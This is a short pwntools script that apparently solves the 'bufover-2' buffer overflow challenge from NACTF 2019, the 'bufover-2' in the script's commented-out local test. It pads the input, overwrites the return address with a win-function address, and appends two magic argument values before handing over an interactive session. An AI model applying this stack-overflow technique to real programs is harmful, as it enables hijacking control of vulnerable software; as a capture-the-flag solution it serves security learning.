from pwn import *

# s = process("./bufover-2")
s = remote("shell.2019.nactf.com",31184)
raw_input('debug')
win_add = 0x80491c2
offset = 0x1c

payload = 'a'*(offset)
payload += p32(win_add)
payload += 'a'*4
payload += p32(0x14B4DA55)
payload += p32(0x0)
payload += p32(0xf00db4be)


s.sendline(payload)
s.interactive()

